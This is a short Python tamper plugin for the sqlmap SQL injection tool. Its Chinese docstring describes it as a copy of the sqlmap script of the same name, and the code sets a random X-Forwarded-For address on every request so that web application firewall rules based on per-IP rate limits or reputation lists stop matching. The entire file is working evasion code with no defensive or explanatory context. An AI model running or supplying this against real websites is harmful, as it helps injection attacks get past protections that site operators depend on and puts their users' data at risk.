"""sqlmap 同名: 每请求随机 X-Forwarded-For 头, 绕按 IP 限速/信誉库的 WAF 规则(不改载荷)。"""
import random


def tamper(payload, headers=None):
    if headers is not None:
        headers['X-Forwarded-For'] = '%d.%d.%d.%d' % (
            random.randint(11, 223), random.randint(0, 255),
            random.randint(0, 255), random.randint(1, 254))
    return payload
